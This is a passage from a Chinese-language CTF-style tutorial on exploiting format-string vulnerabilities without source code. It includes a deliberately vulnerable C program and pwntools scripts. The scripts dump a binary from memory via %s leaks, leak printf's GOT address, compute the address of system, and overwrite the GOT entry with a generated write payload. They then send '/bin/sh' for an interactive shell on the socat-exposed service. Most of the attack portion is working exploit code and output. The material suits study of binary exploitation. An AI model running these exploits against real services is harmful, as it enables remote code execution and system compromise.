    $ python fmt_test.py
    [+] Starting local process './a.out' argv=['a.out'] : Done
    [DEBUG] Sent 0xc bytes:
        00000000  25 31 33 24  73 61 61 61  00 80 04 08               │%13$│saaa│····││
        0000000c
    [DEBUG] Received 0xa bytes:
        00000000  7f 45 4c 46  01 01 01 61  61 61                     │·ELF│···a│aa│
        0000000a
原理都懂了，可以写payload去dump 整个bin回来了
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    f = open("source.bin", "ab+")
    begin = 0x8048000
    offset = 0
    while True:
        addr = begin + offset
        p = process("a.out")
        p.sendline("%13$saaa" + p32(addr))
        try:
            info = p.recvuntil("aaa")[:-3]
        except EOFError:
            print offset
            break
        info += "\x00"
        p.close()
        offset += len(info)
        f.write(info)
        f.flush()
    f.close()
内存数据dump下来后，虽然跟原始bin有很大不同，也运行不了，但是丢到ida中任然是可以看的:
# Write
二进制漏洞的最终目的都是要getshell，所以在我们获取到bin后，接下来就是要getshell了
不过之前的demo过于简单，没有什么好的getshell的方法，对demo进行下修改.
    // fmt_test2.c
    #include 
    int main(int argc, char * argv[])
    {
        char a[1024];
        while(1) 
        {
            memset(a, '\0', 1024);
            read(0, a, 1024);
            printf(a);
            fflush(stdout);
        }
        return 0;
    }
    // $ gcc fmt_test2.c -o fmt_test2 -m32
    // $ socat TCP4-LISTEN:10001,fork EXEC:./fmt_test2
和之前的demo比，多了循环，不像之前一样一下就退出了
在这种情况下，我们可以很容易只依靠格式化字符串漏洞进行攻击
利用的逻辑很简单，根据之前的知识点，leak出bin，然后获取到`printf`函数的got表地址，然后把这个地址的值改为`system`函数的地址，在下次循环的时候，输入`/bin/sh`，则`printf(a);`实际执行的却是`system('/bin/sh')`
利用过程中，第一个知识点: dump 内存数据，也就是上面的内容，得到bin后，可以很容易的获取到got表信息
接下来第二个知识点就是获取`system`函数的地址，不过却需要爆破跑
每次我首先获取`printf`函数的地址，然后再根据自己机子上`printf`和`system`函数之间的差值估测一个大概范围进行爆破，得到的数据和`system`函数中的一些特征数据进行对比，判断是否是system函数
这一步跳过，现在假设自己有libc库，我本地的libc中，`printf`和`system`函数的差值为:`59600`
最后一步，就是通过格式化字符串内容进行写内存了，覆盖got表中的值
这里我们可以使用pwntools神器:
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    printf_got = 0x804a010
    system_add = 0xaaaaaaaa
    def exec_fmt(payload):
        p.sendline(payload)
        return p.recv()
    p = remote("127.0.0.1", 10001)
    autofmt = FmtStr(exec_fmt)
    payload = fmtstr_payload(autofmt.offset, {printf_got: system_add})
上述代码中`autofmt =
FmtStr(exec_fmt)`到这行的内容之前都讲过，接下来就是`fmtstr_payload`函数，这个函数的作用是用来生成格式化字符串漏洞写内存的payload.
上述代码的第一个参数为offset偏移，第二个参数是一个字典，意义是往key的地址，写入value的值，也就是往`0x804a010`地址写入数据`0xaaaaaaaa`
我们来看看输出的payload:
    ...
    >>> payload = fmtstr_payload(autofmt.offset, {printf_got: system_add})
    >>> payload
    '\x10\xa0\x04\x08\x11\xa0\x04\x08\x12\xa0\x04\x08\x13\xa0\x04\x08%154c%11$hhn%12$hhn%13$hhn%14$hhn'
开头16bytes是4个地址:
    0x0804a010
    0x0804a011
    0x0804a012
    0x8004a012
然后是格式化字符串:`%154c`, 输出hex(154)==0x9a bytes的字符，再加上之前的16bytes地址，一共有0xaa bytes
第三部分也是格式化字符串: `%11$hhn%12$hhn%13$hhn%14$hhn`，往第11, 12, 13,
14个参数指向的地址写入一个值，该值等于之前输出的byte数，在这里就是0xaa
而偏移值为11, 所以第11个参数为payload头，也就是`0x0804a010`，然后以此类推
就是通过上述逻辑往相应地址写入相应值的
所以可以写出exp:
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    p = remote("127.0.0.1", 10001)
    # 获取printf的libc地址
    printf_got = 0x804a010
    leak_payload = "b%13$saa" + p32(printf_got)
    p.sendline(leak_payload)
    p.recvuntil("b")
    info = p.recvuntil("aa")[:-2]
    print info.encode('hex')
    # 计算system的libc地址
    print_add = u32(info[:4])
    p_s_offset = 59600     # addr(printf) - addr(system)
    system_add = print_add - p_s_offset
    # 生成payload
    payload = fmtstr_payload(11, {printf_got: system_add})
    # 发送payload
    p.sendline(payload)
    p.sendline('/bin/sh')
    p.interactive()
## 总结
在前几天的NJCTF中有一个pingme的PWN题就是没有源码的格式化字符串漏洞.
二进制文件我拖下来了在我的Github2上
有兴趣的可以自己搭个环境试试看，该题就是只有一个远程可访问的服务，没有bin和libc，不过这题的libc可以通过别的题获取到，所以也可以算是已知libc的题
思路同我上面demo所讲.
## 参考
  1. [格式化字符串漏洞简介](http://paper.seebug.org/papers/Archive/drops2/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
  2. 
  3. 
* * *